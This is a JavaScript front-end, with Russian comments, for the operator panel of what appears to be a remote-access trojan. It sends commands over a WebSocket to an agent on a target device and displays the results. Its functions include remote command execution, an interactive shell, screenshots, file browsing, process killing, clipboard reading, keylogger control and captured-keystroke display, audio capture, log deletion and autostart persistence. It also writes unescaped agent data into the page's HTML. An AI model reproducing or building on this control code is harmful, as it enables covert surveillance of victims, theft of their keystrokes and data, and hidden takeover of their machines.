/**
 * device.js — WebSocket-клиент для управления устройством.
 * Подключается к ws://host/ws/panel/<device_id>/
 * Отправляет команды агенту и отображает ответы.
 */

const deviceId = document.getElementById('device-id').value;
let ws = null;
let shellOpen = false;

// ===== WebSocket =====
function connectWS() {
    const proto = location.protocol === 'https:' ? 'wss' : 'ws';
    const url = `${proto}://${location.host}/ws/panel/${deviceId}/`;

    ws = new WebSocket(url);

    ws.onopen = () => {
        console.log('WS connected');
    };

    ws.onmessage = (event) => {
        const msg = JSON.parse(event.data);
        handleMessage(msg);
    };

    ws.onclose = () => {
        console.log('WS disconnected, reconnect in 3s...');
        setStatus(false);
        setTimeout(connectWS, 3000);
    };

    ws.onerror = (err) => {
        console.error('WS error:', err);
    };
}

function setStatus(online) {
    const dot = document.getElementById('status-dot');
    const text = document.getElementById('status-text');
    if (online) {
        dot.className = 'dot dot-green';
        text.textContent = 'Агент онлайн';
    } else {
        dot.className = 'dot dot-red';
        text.textContent = 'Агент офлайн';
    }
}

// ===== Отправка команд =====
function sendCmd(type, payload) {
    if (!ws || ws.readyState !== WebSocket.OPEN) {
        alert('WebSocket не подключён');
        return;
    }
    ws.send(JSON.stringify({ type: type, payload: payload || {} }));
}

// ===== Обработка ответов =====
function handleMessage(msg) {
    const t = msg.type;
    const p = msg.payload || {};

    // Статус подключения агента
    if (t === 'connection_status') {
        setStatus(p.agent_online);
        return;
    }

    if (t === 'error') {
        alert(p.message || 'Ошибка');
        return;
    }

    // Скриншот
    if (t === 'screenshot_data') {
        const container = document.getElementById('screenshot-container');
        if (p.image_b64) {
            container.innerHTML = `<img src="data:image/jpeg;base64,${p.image_b64}" alt="screenshot">`;
        } else {
            container.innerHTML = '<p class="placeholder">Ошибка получения скриншота</p>';
        }
        return;
    }

    // Exec
    if (t === 'exec_result') {
        const out = document.getElementById('exec-output');
        let text = '';
        if (p.stdout) text += p.stdout + '\n';
        if (p.stderr) text += '[STDERR] ' + p.stderr + '\n';
        text += `[exit code: ${p.returncode}]`;
        out.textContent = text;
        return;
    }

    // Shell
    if (t === 'shell_output') {
        const out = document.getElementById('shell-output');
        out.textContent += (p.stdout || '') + (p.stderr || '');
        out.scrollTop = out.scrollHeight;
        return;
    }
    if (t === 'shell_opened') {
        shellOpen = true;
        document.getElementById('shell-input-row').style.display = 'flex';
        document.getElementById('shell-toggle').textContent = 'Закрыть Shell';
        document.getElementById('shell-output').textContent = '';
        return;
    }
    if (t === 'shell_closed') {
        shellOpen = false;
        document.getElementById('shell-input-row').style.display = 'none';
        document.getElementById('shell-toggle').textContent = 'Открыть Shell';
        return;
    }

    // Пинг / понг
    if (t === 'pong') {
        appendManage('Pong OK');
        return;
    }

    // Heartbeat
    if (t === 'heartbeat') {
        appendManage('Heartbeat: ' + JSON.stringify(p));
        return;
    }

    // Sysinfo
    if (t === 'sysinfo') {
        const out = document.getElementById('sysinfo-output');
        out.textContent = formatSysinfo(p);
        return;
    }

    // Процессы
    if (t === 'process_list') {
        renderProcessList(p);
        return;
    }
    if (t === 'process_kill_result') {
        appendManage('Kill: ' + (p.message || JSON.stringify(p)));
        return;
    }

    // FS list
    if (t === 'fs_list') {
        renderFsList(p);
        return;
    }

    // Clipboard
    if (t === 'clipboard_result') {
        const out = document.getElementById('sysinfo-output');
        out.textContent = 'Буфер обмена:\n' + (p.text || p.message || JSON.stringify(p));
        return;
    }

    // Keylogger
    if (t === 'keylog_status') {
        appendKeylog('Кейлоггер: ' + (p.status || ''));
        return;
    }
    if (t === 'keylog_data') {
        const out = document.getElementById('keylog-output');
        out.textContent = p.data || '(пусто)';
        return;
    }

    // Аудио
    if (t === 'audio_status' || t === 'audio_list') {
        const out = document.getElementById('audio-output');
        out.textContent = JSON.stringify(p, null, 2);
        return;
    }

    // Обновление
    if (t === 'update_status') {
        appendManage('Update: ' + (p.message || p.status || ''));
        return;
    }

    // Логи
    if (t === 'log_view_result') {
        appendManage(p.lines || p.message || 'Нет данных');
        return;
    }
    if (t === 'log_delete_result') {
        appendManage(p.message || 'OK');
        return;
    }

    // Автозапуск
    if (t === 'autostart_result') {
        appendManage('Автозапуск: ' + (p.message || JSON.stringify(p)));
        return;
    }

    // Рестарт
    if (t === 'server_restart_ack') {
        appendManage('Сервер перезапускается...');
        return;
    }

    // Остальные — в manage output
    appendManage(t + ': ' + JSON.stringify(p));
}

// ===== Вспомогательные функции =====
function execCmd() {
    const input = document.getElementById('exec-input');
    const cmd = input.value.trim();
    if (!cmd) return;
    sendCmd('exec', { command: cmd, timeout: 60 });
}

function toggleShell() {
    if (shellOpen) {
        sendCmd('shell_close', {});
    } else {
        sendCmd('shell_open', {});
    }
}

function shellSend() {
    const input = document.getElementById('shell-input');
    sendCmd('shell_input', { data: input.value });
    input.value = '';
}

function fsBrowse() {
    const path = document.getElementById('fs-path').value;
    sendCmd('fs_list', { path: path });
}

function killProc() {
    const input = document.getElementById('kill-input');
    const val = input.value.trim();
    if (!val) return;
    const isNum = /^\d+$/.test(val);
    sendCmd('process_kill', isNum ? { pid: parseInt(val) } : { name: val });
}

function appendManage(text) {
    const out = document.getElementById('manage-output');
    out.textContent += text + '\n';
    out.scrollTop = out.scrollHeight;
}

function appendKeylog(text) {
    const out = document.getElementById('keylog-output');
    out.textContent += text + '\n';
}

function formatSysinfo(p) {
    let lines = [];
    for (const [key, val] of Object.entries(p)) {
        if (typeof val === 'object') {
            lines.push(`${key}:`);
            for (const [k2, v2] of Object.entries(val)) {
                lines.push(`  ${k2}: ${v2}`);
            }
        } else {
            lines.push(`${key}: ${val}`);
        }
    }
    return lines.join('\n');
}

function renderProcessList(p) {
    const container = document.getElementById('process-list');
    const procs = p.processes || [];
    if (!procs.length) {
        container.textContent = 'Нет данных';
        return;
    }
    let html = '<table style="width:100%;font-size:12px;"><tr><th>PID</th><th>Name</th><th>CPU%</th><th>Mem MB</th></tr>';
    for (const proc of procs.slice(0, 200)) {
        html += `<tr>
            <td>${proc.pid}</td>
            <td>${proc.name}</td>
            <td>${proc.cpu || 0}</td>
            <td>${proc.mem_mb || 0}</td>
        </tr>`;
    }
    html += '</table>';
    container.innerHTML = html;
}

function renderFsList(p) {
    const container = document.getElementById('fs-list');
    const entries = p.entries || [];
    const currentPath = p.path || '.';

    let html = '';
    for (const entry of entries) {
        const isDir = entry.is_dir;
        const cls = isDir ? 'fs-dir' : 'fs-file';
        const icon = isDir ? '\u{1F4C1}' : '\u{1F4C4}';
        const size = isDir ? '' : ` (${entry.size || 0} bytes)`;
        const fullPath = currentPath + '/' + entry.name;
        html += `<div class="fs-item ${cls}" onclick="fsNavigate('${fullPath.replace(/'/g, "\\'")}', ${isDir})">
            ${icon} ${entry.name}${size}
        </div>`;
    }
    container.innerHTML = html || '<div class="fs-item">Пусто</div>';
}

function fsNavigate(path, isDir) {
    if (isDir) {
        document.getElementById('fs-path').value = path;
        fsBrowse();
    }
}

// ===== Вкладки =====
document.querySelectorAll('.tab').forEach(tab => {
    tab.addEventListener('click', () => {
        document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
        document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
        tab.classList.add('active');
        document.getElementById(tab.dataset.tab).classList.add('active');
    });
});

// ===== Запуск =====
connectWS();
